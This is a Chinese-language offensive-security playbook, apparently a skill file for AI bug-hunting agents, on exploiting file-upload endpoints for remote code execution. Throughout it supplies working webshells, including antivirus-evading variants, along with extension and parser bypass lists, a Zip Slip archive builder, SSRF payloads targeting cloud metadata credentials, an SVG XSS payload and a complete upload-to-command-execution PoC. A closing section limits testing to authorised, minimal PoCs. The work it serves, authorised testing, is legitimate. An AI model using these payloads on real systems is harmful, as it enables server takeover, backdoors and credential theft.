# 文件上传 / 任意写入 → RCE

> 让服务器把「你控制的字节」存到它能解析的地方。两层都得破：(a) 绕过校验（扩展名/MIME/文件头/内容），(b) 触发解析（直接访问 / 解析漏洞 / 处理器 SSRF/XXE）。成功 = 直接 RCE（P0）；失败 = 受限上传（P2/P3）。

**取材来源**：[MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)、[elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)、[SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)；权威公开源 PayloadsAllTheThings / PortSwigger。

---

## 1. 触发信号

- 任何上传入口：头像、附件、富文本编辑器、导入（CSV/Excel/ZIP）、插件/主题安装、备份恢复、批量文件上传。
- 上传响应回显 `path`/`url`/`filename` 字段 → 路径已知；`/uploads/` `/upload/` `/files/` 可直接列目录。
- 上传后有「校验→移动」「扫描→删除」流程，或上传同时直出预览 URL（竞态 / 解析时机窗口）。
- 站点特征命中解析漏洞指纹：IIS 6.0 + `.asp;.jpg`；Apache + 可上传 `.htaccess`；Nginx + `x.jpg/y.php` 返回 200（fix_pathinfo）。
- **上传被拦、但同一份文件换一条代码路径就能落地**：站点同时存在"上传"与"复制 / 重命名 / 移动 / 解压 / 模板导入"等入口，而后者漏了同一套扩展名校验（来源：HTB-Hathor —— 上传接口按白名单拦 `.aspx`，文件管理器的 Copy 只校验**源**扩展名）。
- **站点是经典 ASP.NET（WebForms）且上传目录在 Web 根内**：`.aspx` / `.ashx` / `.asmx` 等在**请求时**被运行时编译执行，上传即可执行（来源：HTB-Hathor）。

**真实案例指纹** `[本地 src-hunter]`：

- wooyun-2015-0135258：FCKeditor 编辑器漏洞（公共交通）
- wooyun-2016-0167456：`%00` 截断（金融系统）
- wooyun-2014-064031：万户 OA ezOffice 截断绕过
- wooyun-2015-0149146：JSPX 绕过（保险系统）
- wooyun-2014-063369：Finecms 竞态条件
- wooyun-2015-0158311：Nginx 解析漏洞（门户网站）
- 通用指纹：上传响应含 `path`/`url`/`filename` → 路径已知；`/uploads/` 可列目录 → 可浏览；IIS6 + `.asp;.jpg` → 经典解析；Apache 可传 `.htaccess` → 改解析规则

## 2. 高频入口点

**上传点分布（前 50 案例统计 `[本地 src-hunter]`）**：

| 类型 | 占比 | 路径特征 |
|---|---|---|
| 富文本编辑器 | 42% | `/fckeditor/` `/ewebeditor/` `/ueditor/` `/kindeditor/` |
| 头像 | 18% | `/upload/avatar/` `/member/uploadfile/` |
| 附件 / 文档 | 15% | `/uploads/` `/attachment/` |
| 后台功能 | 12% | `/admin/upload/` `/system/upload/` |
| 业务 | 8% | `/apply/` `/submit/` `/import/` |
| 导入 | 5% | `/import/` `/excelUpload/` |

**编辑器测试路径速查** `[本地 src-hunter]`：

```
/FCKeditor/editor/filemanager/browser/default/browser.html
/FCKeditor/editor/filemanager/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/
/ewebeditor/admin/default.jsp
/ueditor/php/controller.php?action=config
/kindeditor/php/file_manager_json.php
/ckfinder/userfiles/files/
```

**后端类型快表** `[本地 src-hunter]`：`.php/.phtml/.phar` → PHP；`.jsp/.jspx` → Tomcat；`.asp/.aspx/.cer` → IIS/ASP.NET；`.htaccess`（Apache 改解析规则）/`web.config`（IIS）本身也是攻击载荷。

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **基线**：上传一个合法文件（正常图片），确认路径、命名规则、是否回显 URL `[本地 src-hunter]`。
2. **客户端校验绕过**：禁 JS / curl 直接发包 / Burp 改 filename 与 content-type `[本地 src-hunter]`。
3. **扩展名绕过**：大小写 `.Php` → 双写 `.pphphp` → 特殊后缀 `.phtml/.php5/.phar` → 空格/点 `.php ` `.php.` → `%00` 截断 → `::$DATA` `[本地 src-hunter]`。
4. **Content-Type / 文件头绕过**：改 `image/jpeg`；内容前置 `GIF89a`/`ÿØÿà`/`\x89PNG` magic bytes `[本地 src-hunter + Claude-BugHunter]`。
5. **触发解析**：直接访问 `/uploads/shell.php?cmd=id`；或借解析漏洞（IIS6 `.asp;.jpg`、Apache 多后缀、Nginx `x.jpg/.php`）`[本地 src-hunter]`。
6. **路径获取**：响应回显 / 编辑器目录遍历 / 时间戳爆破（±60s）/ 配合 `.git` 泄露 `[本地 src-hunter]`。
7. **进阶（仅授权）**：Zip Slip（上传压缩包解压路径穿越）、polyglot、ImageMagick/FFmpeg SSRF、SVG/HTML 存储 XSS、竞态（上传后删除前访问）。
8. **降级原则**：黑名单被拦 → 换大小写/双写/特殊后缀 → 白名单被拦 → 解析漏洞/`.htaccess`/路径穿越 → 内容扫描被拦 → 变量函数/编码/拼接。

## 4. Payload 区（每条标注出处）

### 4.1 扩展名 / MIME / 文件头绕过 `[本地 src-hunter + Claude-Red]`

```bash
# 图片马（GIF 头 + PHP）
echo -ne "GIF89a\n<?php @eval(\$_POST['c']);?>" > shell.gif
# 图片马（PNG 二进制头 + 注释段藏 PHP）
cat real.jpg shell.php > fake.jpg
# EXIF 注入
exiftool -Comment="<?php system(\$_GET['cmd']);?>" image.jpg
# Content-Type 伪造
curl -F "file=@shell.php;type=image/jpeg;filename=shell.php" "https://target/upload"
```

```text
# 扩展名绕过变体
shell.php.jpg  shell.php%00.jpg  shell.phtml  shell.php5  shell.phar  shell.PhP
shell.php.   shell.php    shell.asp;.jpg   shell.php::$DATA   shell.pphphp
```

### 4.2 Webshell 内容免杀 `[本地 src-hunter]`

```text
PHP 变量函数   <?php $a='ass'.'ert'; $a($_POST['c']);?>
PHP 回调       <?php array_map('assert', $_POST);?>
JSP            <%Runtime.getRuntime().exec(request.getParameter("c"));%>
ASP            <%execute(request("c"))%>
```

> SRC 报告只停在最简单的 shell 执行 `id`：`<%out.println(Runtime.getRuntime().exec("id").getInputStream());%>` `[本地 src-hunter]`。

### 4.3 解析漏洞触发 `[本地 src-hunter]`

| 服务器 | 漏洞 | Payload |
|---|---|---|
| IIS 6.0 文件 | `shell.asp;.jpg` → 当 ASP | 直接命名 |
| Apache 多后缀 | `shell.php.xxx` → 当 PHP | 命名为 `shell.php.xxx` |
| Apache .htaccess | `AddType application/x-httpd-php .jpg` | 传 .htaccess 后再传 .jpg |
| Apache CVE-2017-15715 | `shell.php\x0a` | 文件名末加 `\n` |
| Nginx fix_pathinfo | `shell.jpg/x.php` → 当 PHP | URL 路径拼接 |
| Nginx CVE-2013-4547 | `shell.jpg \0.php` | 空字节 |
| Tomcat CVE-2017-12615 | PUT `/shell.jsp/` | PUT 方法 |

### 4.4 Zip Slip / 路径穿越 `[本地 src-hunter + Claude-BugHunter]`

```python
import zipfile
with zipfile.ZipFile("evil.zip", "w") as zf:
    zf.writestr("readme.txt", "Normal file")
    zf.writestr("../../../var/www/html/test_shell.php",
                "<?php echo system($_GET['cmd']); ?>")
```

```bash
# 工具生成
pip3 install evilarc
python3 evilarc.py shell.php -o unix -p "../../../var/www/html/" -d 5 -f /tmp/zipslip.zip
# 上传文件名路径穿越
filename=../../../../etc/passwd
filename=..%2f..%2f..%2ftmp%2fshell.php
```

### 4.5 处理器 SSRF / XXE / XSS（节选）`[Claude-BugHunter + Claude-Red]`

```bash
# ImageMagick MVG SSRF（ImageTragick 家族 CVE-2016-3714）
printf 'push graphic-context\nviewbox 0 0 640 480\nfill "url(http://169.254.169.254/latest/meta-data/)"\npop graphic-context\n' > ssrf.mvg
# SVG 存储 XSS
printf '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>' > x.svg
# FFmpeg HLS SSRF
printf '#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\n#EXT-X-ENDLIST\n' > ssrf.m3u8
```

**Magic bytes 参考** `[Claude-BugHunter]`：JPEG `FF D8 FF` / PNG `89 50 4E 47 0D 0A 1A 0A` / GIF `47 49 46 38` / PDF `25 50 44 46` / ZIP-DOCX `50 4B 03 04`。

### 4.6 Bypass 矩阵 `[本地 src-hunter]`

| 防护 | 绕过 |
|---|---|
| 客户端 JS | 禁 JS / 抓包改包 |
| 黑名单后缀 | 大小写、双写、特殊后缀 |
| 白名单 | `%00`（旧）、解析漏洞、`.jsp/x.jsp.png` |
| Content-Type | 改 `image/jpeg` |
| 文件头 | `GIF89a` 头 + 脚本 |
| 内容静态扫描 | 变量函数 / 编码 / 拼接 |
| 大小限制 | Chunked / 分片上传 |
| 二次渲染 | EXIF / GIF 注释段 / PNG tEXt |
| 上传后路径不返回 | 编辑器遍历 / 时间戳爆破 / 源码泄露 |
| 删除时间窗 | 竞态：多线程上传 + 立即访问 |
| 非脚本目录 | `filename=../../webroot/shell.php` 路径穿越 |

### 4.7 校验缺失的二次代码路径（复制 / 重命名 / 移动 / 解压）`[HTB-Hathor 实战]`

**信号**：上传接口对扩展名做了白名单，但同一个后台还提供"复制 / 重命名 / 移动 / 解压 / 导入模板"等操作。

**原理**：这类操作往往由**另一段代码**实现，只校验了**源**文件（或只校验了目标目录），没有校验**目标文件名**。mojoPortal 2.7.0.0 实例：

```csharp
// Web/Controllers/FileManager/FileServiceController.cs -> CopyItem()
if (AllowedExtension(file))                     // 只查【源文件】扩展名：shell.txt 合法
{
    string newFile = FilePath(newPath + "/" + CleanFileName(singleFileName, "file"));  // 目标名不过白名单
    result = fileSystem.CopyFile(file, newFile, overwriteExistingFiles);
}
```

**验证顺序**（每步保持"只改一个变量"）：

1. 用白名单内的扩展名上传一个最小验证页（如 `.txt`），确认落地路径与可访问 URL；
2. 用 **Copy**（不是 Rename）把副本命名为可执行后缀 —— Rename 常见实现是"移动并改名"，**源与目标都校验**，会失败；
3. 直链访问该文件确认执行（HTB-Hathor：一行 `<%@ Page Language="C#" %><% Response.Write(...) %>` 即可）；
4. **列表过滤 ≠ 文件不存在**：管理界面列表通常也按同一白名单过滤，复制出的 `.aspx` 在界面上看不到，但 URL 可直接访问。

**同类可测点**：重命名、移动、目录复制、ZIP 解压后的落盘、模板/皮肤/插件导入、图片压缩产生的派生文件 —— 任一条路径只要漏了同一套校验，白名单就形同虚设。

## 5. 工具用法

```bash
# fuxploider：上传点自动探测 [Claude-Red]
python3 fuxploider.py --url "https://target/upload.php" --not-regex "not allowed"
# exiftool 元数据注入 [本地 src-hunter]
exiftool -Comment="<?php system(\$_GET['cmd']);?>" image.jpg
# 手工 multipart（改 Content-Type / filename）
curl -F "file=@shell.php;type=image/jpeg;filename=shell.php" "https://target/upload"
# 验证执行
curl "https://target/uploads/shell.php?cmd=id"
# 扩展名/参数 fuzz
ffuf -w /usr/share/seclists/Fuzzing/extensions.txt -u "https://target/uploads/FUZZ" -mc 200
```

> 纪律：上传 1–3 个 PoC 文件即停；文件名写 `poc-{date}-{nick}.jsp`，报告里主动告知路径并请求删除。

## 6. 证据要求

**「已确认」必须满足**：① 完整上传 multipart 包；② 上传响应（含返回 URL）；③ 访问 webshell 的请求+响应；④ 命令执行输出（`id`，脱敏内网信息）。仅「文件上传成功但从不被解析/执行」= 只写 blob，不算 RCE `[Claude-BugHunter]`。

**PoC 模板** `[本地 src-hunter]`：

```http
POST /upload.jsp HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=xxx

--xxx
Content-Disposition: form-data; name="file"; filename="poc-2025-05-09.jsp"
Content-Type: image/jpeg

<%out.println(Runtime.getRuntime().exec("id").getInputStream());%>
--xxx--

→ {"url":"/uploads/20250509142312poc-2025-05-09.jsp"}
GET /uploads/20250509142312poc-2025-05-09.jsp
→ uid=1001(tomcat) gid=1001(tomcat)
```

**CVSS 参考** `[本地 src-hunter]`：未授权任意文件上传→RCE = 9.8；认证后任意文件上传→RCE = 8.8；受限上传（仅前缀绕过）= 6.5。

## 7. 合规边界 / 不要做的事

- **禁**：上传真正的 webshell（后门、加密通道）。只用最简单的 `<?php system($_GET['cmd']);?>` 或 JSP 执行 `id` `[本地 src-hunter]`。
- **禁**：上传后做提权、横向、持久化 `[本地 src-hunter]`。
- **禁**：上传可被他人误访问的内容（钓鱼页、外链脚本）`[本地 src-hunter]`。
- **禁**：留下 shell 不清理。报告里主动告知文件路径并请求删除 `[本地 src-hunter]`。
- **禁**：覆盖现有合法文件（如 `index.jsp`）——影响业务 `[本地 src-hunter]`。
- **限**：1–3 个 PoC 文件即停，不批量上传；PoC 文件名含 `poc`+日期+昵称，报告写明「请贵方修复后删除」`[本地 src-hunter]`。
- Zip Slip / 覆盖 `/etc/cron.d` 等只构造不落地；DOX/XXE 用自己 OOB 域名，不外发真实内网数据 `[本地 src-hunter + Claude-BugHunter]`。
